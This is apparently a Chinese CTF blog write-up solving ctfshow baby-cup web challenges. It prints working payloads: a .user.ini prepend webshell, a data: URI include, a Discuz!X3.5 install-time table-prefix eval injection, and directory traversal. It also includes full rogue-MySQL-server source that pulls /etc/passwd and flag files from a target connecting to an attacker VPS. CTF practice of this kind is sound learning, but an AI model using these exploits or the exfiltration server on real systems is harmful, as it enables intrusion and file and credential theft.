+++
title = "ctfshowbaby杯"
slug = "ctfshow-baby-cup"
description = "刷"
date = "2025-01-11T21:36:00"
lastmod = "2025-01-11T21:36:00"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["mysql", "php"]
+++

## baby_captcha

密码是`fire`，验证码自己听的出来

## baby_php

```php
<?php

error_reporting(0);

class fileUtil{

    private $name;
    private $content;


    public function __construct($name,$content=''){
        $this->name = $name;
        $this->content = $content;
        ini_set('open_basedir', '/var/www/html');
    }

    public function file_upload(){
        if($this->waf($this->name) && $this->waf($this->content)){
            return file_put_contents($this->name, $this->content);
        }else{
            return 0;
        }
    }

    private function waf($input){
        return !preg_match('/php/i', $input);
    }

    public function file_download(){
        if(file_exists($this->name)){
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.$this->name.'"');
            header('Content-Transfer-Encoding: binary');
            echo file_get_contents($this->name);
        }else{
            return False;
        }
    }

    public function __destruct(){

    }

}

$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);

if($action==='upload'){
    die('Permission denied');
}

switch ($action) {
    case 'upload':
        $name = $_POST['name'];
        $content = $_POST['content'];
        $ft = new fileUtil($name,$content);
        if($ft->file_upload()){
            echo $name.' upload success!';
        }
        break;
    case 'download':
        $name = $_POST['name'];
        $ft = new fileUtil($name,$content);
        if($ft->file_download()===False){
            echo $name.' download failed';
        }
        break;
    default:
        echo 'baby come on';
        break;
}
```

映入眼帘的是可以写文件但是有个`waf`，这里不知道怎么整，并且限定了写入路径为当前目录，还有就是触发`upload`的问题

```php
<?php

$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);

if($action==='upload'){
    die('Permission denied');
}

switch ($action) {
    case 'upload':
        echo "success";
        break;
    case 'download':
        echo "nono";
        break;
    default:
        echo 'baby come on';
        break;
}
```

本地起一个demo发现直接就绕过了，然后我们FUZZ出来，可以使用`.user.ini`进行绕过

```
name=.user.ini&content=auto_prepend_file=1.txt
content=<?=`ls`?>&name=1.txt
```

## 完美的缺点

```php
<?php


highlight_file(__FILE__);
error_reporting(0);
ini_set('open_basedir', '/var/www/html/');

$file_name = substr($_GET['file_name'], 0,16);
$file_content=substr($_GET['file_content'], 0,32);

file_put_contents('/c/t/f/s/h/o/w/'.$file_name, $file_content);

if(file_get_contents('php://input')==='ctfshow'){
    include($file_name);
}
```

虽然限制了路径，但是进行了文件包含，这里可以直接用伪协议进行绕过

```
?file_name=data:,<?=`nl%20*`;

POST:
ctfshow
```

笔记，别的师傅那里直接掏的

```
data:,<文本数据>  
data:text/plain,<文本数据>  
data:text/html,<HTML代码>  
data:text/html;base64,<base64编码的HTML代码>  
data:text/css,<CSS代码>  
data:text/css;base64,<base64编码的CSS代码>  
data:text/javascript,<Javascript代码>  
data:text/javascript;base64,<base64编码的Javascript代码>  
data:image/gif;base64,base64编码的gif图片数据  
data:image/png;base64,base64编码的png图片数据  
data:image/jpeg;base64,base64编码的jpeg图片数据  
data:image/x-icon;base64,base64编码的icon图片数据
```

## 应该不难

Discuz!X3.5 ，进来之后拿到版本，我估计就是一个NDAY，可能当时是1DAY或者0DAY，但是现在是2025年哈哈，可以直接`getshell`，原因是后台代码没有做处理，直接拼接参数进行写入配置

```php
function save_uc_config($config, $file) {

    $success = false;

    list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;

    $link = function_exists('mysql_connect') ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);
    $uc_connnect = $link ? 'mysql' : '';

    $date = gmdate("Y-m-d H:i:s", time() + 3600 * 8);
    $year = date('Y');
    $config = <<<EOT
<?php


define('UC_CONNECT', '$uc_connnect');

define('UC_DBHOST', '$ucdbhost');
define('UC_DBUSER', '$ucdbuser');
define('UC_DBPW', '$ucdbpw');
define('UC_DBNAME', '$ucdbname');
define('UC_DBCHARSET', '$ucdbcharset');
define('UC_DBTABLEPRE', '`$ucdbname`.$uctablepre');
define('UC_DBCONNECT', 0);

define('UC_CHARSET', '$uccharset');
define('UC_KEY', '$appauthkey');
define('UC_API', '$ucapi');
define('UC_APPID', '$appid');
define('UC_IP', '$ucip');
define('UC_PPP', 20);
?>
EOT;

    if($fp = fopen($file, 'w')) {
        fwrite($fp, $config);
        fclose($fp);
        $success = true;
    }
    return $success;
}
```

而源头是初始化数据库的时候

```php
if(DZUCFULL) {
            install_uc_server();
        }
```

```php
save_uc_config($config, ROOT_PATH.'./config/config_ucenter.php');
```

所以直接在安装的时候，修改表前缀

```
x');@eval($_POST[1]);('
```

访问`/config/config_ucenter.php`，就可以任意命令执行了

## ctfshowcms

把附件解压之后看到就那么几个文件，其中有用的没几个，一个是进管理员的

```php
/*files/admin.php*/
<?php

$username=$_POST['username'];
$password=$_POST['password'];

if($username==="admin"&&md5($password)==="577d18223db4b9062c1861555fdcc18a"){
    $choice = $_POST['choice'];
    if($choice === "giveMeFlag"){
        echo "flag{fl@g_1s_n0t_h3re}";
    }else if($choice === "tellMeHowToGetFlag"){
        echo "flag is in your heart";
    }else if($choice ==="giveMeTheYellowPicture"){
        echo "http://127.0.0.1:3306/";
    }else{
        echo "you are Admin,make your choice!";
    }
}
```

```php
/*install/index.php*/
<?php
header('Content-Type:text/html;charset=utf-8');
if(file_exists("installLock.txt")){
    echo "你已经安装了ctfshowcms，请勿重复安装。";
    exit;
}

echo "欢迎安装ctfshowcms~"."<br>";


$user=$_POST['user'];
$password=md5($_POST['password']);
$dbhost=$_POST['dbhost'];
$dbuser=$_POST['dbuser'];
$dbpwd=$_POST['dbpwd'];
$dbname=$_POST['dbname'];
if($user==""){
    echo "CMS管理员用户名不能为空！";
    exit();
}
if($password==""){
    echo "CMS管理员密码不能为空！";
    exit();
}
if($dbhost==""){
    echo "数据库地址不能为空！";
    exit();
}
if($dbuser==""){
    echo "数据库用户名不能为空！";
    exit();
}
if($dbpwd==""){
    echo "数据库密码不能为空！";
    exit();
}
if($dbname==""){
    echo "数据库名不能为空！";
    exit();
}
// 连接数据库
$db = mysql_connect ( $dbhost, $dbuser, $dbpwd )  or die("数据库连接失败");

// 选择使用哪个数据库
$a = mysql_select_db ( $dbname, $db );
// 数据库编码方式
$b = mysql_query ( 'SET NAMES ' . 'utf-8', $db );

if(file_exists("ctfshow.sql")){
    echo "正在写入数据库！";
}else{
    die("sql文件不存在");
}

$content = "<?php
\$DB_HOST='".$dbhost."';
\$DB_USER='".$dbuser."';
\$DB_PWD='".$dbpwd."';
\$DB_NAME='".$dbname."';
?>
";


file_put_contents(ROOT_PATH."/data/settings.php",$content);
echo "数据库设置写入成功！~"."<br>";

$of = fopen(ROOT_PATH.'/install/installLock.txt','w');
if($of){
    fwrite($of,"ctfshowcms");
}
echo "安装成功！";
```

可以看到也是直接拼接参数，可以直接写入恶意代码，还有就是任意文件读取

```php
/*index.php*/
<?php

define("ROOT_PATH",__DIR__);

error_reporting(0);

$want = addslashes($_GET['feng']);
$want = $want==""?"index":$want;

include('files/'.$want.".php");
```

这里的`addslashes`只是用来防sql注入的，所以文件读取根本拦不住，直接目录穿越即可，但是如果直接重新安装的话其实是不会成功的，因为链接不上

```
?feng=../install/index

POST:
user=1&password=1&dbhost=127.0.0.1:3306&dbuser=feng&dbpwd=feng&dbname=ctfshow
```

```
?feng=../install/index

POST:
user=1&password=1&dbhost=127.0.0.1:3306&dbuser=root&dbpwd=root&dbname=ctfshow
```

这里有一个mysql数据库读取漏洞[文章地址](https://www.modb.pro/db/51823)，那么我们在vps上面安装数据库先

```shell
sudo apt-get install mysql-server 
sudo apt-get install mysql-client 
sudo apt-get install libmysqlclient-dev
```

脚本的位置[脚本](https://github.com/MorouU/rogue_mysql_server/blob/main/rogue_mysql_server.py)

```php
from socket import AF_INET, SOCK_STREAM, error
from asyncore import dispatcher, loop as _asyLoop
from asynchat import async_chat
from struct import Struct
from sys import version_info
from logging import getLogger, INFO, StreamHandler, Formatter

_rouge_mysql_sever_read_file_result = {

}
_rouge_mysql_server_read_file_end = False


def checkVersionPy3():
    return not version_info < (3, 0)


def rouge_mysql_sever_read_file(fileName, port, showInfo):
    if showInfo:
        log = getLogger(__name__)
        log.setLevel(INFO)
        tmp_format = StreamHandler()
        tmp_format.setFormatter(Formatter("%(asctime)s : %(levelname)s : %(message)s"))
        log.addHandler(
            tmp_format
        )

    def _infoShow(*args):
        if showInfo:
            log.info(*args)

    # ================================================
    # =======No need to change after this lines=======
    # ================================================

    __author__ = 'Gifts'
    __modify__ = 'Morouu'

    global _rouge_mysql_sever_read_file_result

    class _LastPacket(Exception):
        pass

    class _OutOfOrder(Exception):
        pass

    class _MysqlPacket(object):
        packet_header = Struct('<Hbb')
        packet_header_long = Struct('<Hbbb')

        def __init__(self, packet_type, payload):
            if isinstance(packet_type, _MysqlPacket):
                self.packet_num = packet_type.packet_num + 1
            else:
                self.packet_num = packet_type
            self.payload = payload

        def __str__(self):
            payload_len = len(self.payload)
            if payload_len < 65536:
                header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num)
            else:
                header = _MysqlPacket.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

            result = "".join(
                (
                    header.decode("latin1") if checkVersionPy3() else header,
                    self.payload
                )
            )

            return result

        def __repr__(self):
            return repr(str(self))

        @staticmethod
        def parse(raw_data):
            packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0])
            payload = raw_data[1:]

            return _MysqlPacket(packet_num, payload.decode("latin1") if checkVersionPy3() else payload)

    class _HttpRequestHandler(async_chat):

        def __init__(self, addr):
            async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.stateList = [b"LEN", b"Auth", b"Data", b"MoreLength", b"File"] if checkVersionPy3() else ["LEN",
                                                                                                           "Auth",
                                                                                                           "Data",
                                                                                                           "MoreLength",
                                                                                                           "File"]
            self.state = self.stateList[0]
            self.sub_state = self.stateList[1]
            self.logined = False
            self.file = ""
            self.push(
                _MysqlPacket(
                    0,
                    "".join((
                        '\x0a',  # Protocol
                        '5.6.28-0ubuntu0.14.04.1' + '\0',
                        '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                    )))
            )

            self.order = 1
            self.states = [b'LOGIN', b'CAPS', b'ANY'] if checkVersionPy3() else ['LOGIN', 'CAPS', 'ANY']

        def push(self, data):
            _infoShow('Pushed: %r', data)
            data = str(data)
            async_chat.push(self, data.encode("latin1") if checkVersionPy3() else data)

        def collect_incoming_data(self, data):
            _infoShow('Data recved: %r', data)
            self.ibuffer.append(data)

        def found_terminator(self):
            data = b"".join(self.ibuffer) if checkVersionPy3() else "".join(self.ibuffer)
            self.ibuffer = []

            if self.state == self.stateList[0]:  # LEN
                len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord(
                    data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1
                if len_bytes < 65536:
                    self.set_terminator(len_bytes)
                    self.state = self.stateList[2]  # Data
                else:
                    self.state = self.stateList[3]  # MoreLength
            elif self.state == self.stateList[3]:  # MoreLength
                if (checkVersionPy3() and data[0] != b'\0') or data[0] != '\0':
                    self.push(None)
                    self.close_when_done()
                else:
                    self.state = self.stateList[2]  # Data
            elif self.state == self.stateList[2]:  # Data
                packet = _MysqlPacket.parse(data)
                try:
                    if self.order != packet.packet_num:
                        raise _OutOfOrder()
                    else:
                        # Fix ?
                        self.order = packet.packet_num + 2
                    if packet.packet_num == 0:
                        if packet.payload[0] == '\x03':
                            _infoShow('Query')

                            self.set_terminator(3)
                            self.state = self.stateList[0]  # LEN
                            self.sub_state = self.stateList[4]  # File
                            self.file = fileName.pop(0)

                            # end
                            if len(fileName) == 1:
                                global _rouge_mysql_server_read_file_end
                                _rouge_mysql_server_read_file_end = True

                            self.push(_MysqlPacket(
                                packet,
                                '\xFB{0}'.format(self.file)
                            ))
                        elif packet.payload[0] == '\x1b':
                            _infoShow('SelectDB')
                            self.push(_MysqlPacket(
                                packet,
                                '\xfe\x00\x00\x02\x00'
                            ))
                            raise _LastPacket()
                        elif packet.payload[0] in '\x02':
                            self.push(_MysqlPacket(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise _LastPacket()
                        elif packet.payload == '\x00\x01':
                            self.push(None)
                            self.close_when_done()
                        else:
                            raise ValueError()
                    else:
                        if self.sub_state == self.stateList[4]:  # File
                            _infoShow('-- result')
                            # fileContent
                            _infoShow('Result: %r', data)
                            if len(data) == 1:
                                self.push(
                                    _MysqlPacket(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise _LastPacket()
                            else:
                                self.set_terminator(3)
                                self.state = self.stateList[0]  # LEN
                                self.order = packet.packet_num + 1

                            global _rouge_mysql_sever_read_file_result
                            _rouge_mysql_sever_read_file_result.update(
                                {self.file: data.encode() if not checkVersionPy3() else data}
                            )

                            # test
                            # print(self.file + ":\n" + content.decode() if checkVersionPy3() else content)

                            self.close_when_done()

                        elif self.sub_state == self.stateList[1]:  # Auth
                            self.push(_MysqlPacket(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise _LastPacket()
                        else:
                            _infoShow('-- else')
                            raise ValueError('Unknown packet')
                except _LastPacket:
                    _infoShow('Last packet')
                    self.state = self.stateList[0]  # LEN
                    self.sub_state = None
                    self.order = 0
                    self.set_terminator(3)
                except _OutOfOrder:
                    _infoShow('Out of order')
                    self.push(None)
                    self.close_when_done()
            else:
                _infoShow('Unknown state')
                self.push('None')
                self.close_when_done()

    class _MysqlListener(dispatcher):
        def __init__(self, sock=None):
            dispatcher.__init__(self, sock)

            if not sock:
                self.create_socket(AF_INET, SOCK_STREAM)
                self.set_reuse_addr()
                try:
                    self.bind(('', port))
                except error:
                    exit()

                self.listen(1)

        def handle_accept(self):
            pair = self.accept()

            if pair is not None:
                _infoShow('Conn from: %r', pair[1])
                _HttpRequestHandler(pair)

                if _rouge_mysql_server_read_file_end:
                    self.close()

    _MysqlListener()
    _asyLoop()
    return _rouge_mysql_sever_read_file_result


if __name__ == '__main__':

    for name, content in rouge_mysql_sever_read_file(fileName=["/etc/passwd", "/etc/hosts"], port=3307,showInfo=True).items():
        print(name + ":\n" + content.decode())
```

将尾巴修改，读取`flag`文件，然后查看数据库登录的文件

```
sudo cat /etc/mysql/debian.cnf
```

然后运行，打入`poc`即可，其中参数可以在php文件中得知，然后就可以监听到flag了

```
?feng=../install/index

user=1&password=1&dbhost=27.25.151.48:3307&dbuser=username&dbpwd=password&dbname=1
```

由于他没做数据库参数的校验脚本也是可以直接利用的，所以数据库是随便填写，但是用户名和密码必须正确才可以，就是`debian.cnf`里面的，并且这个脚本要使用`python2.7`进行利用
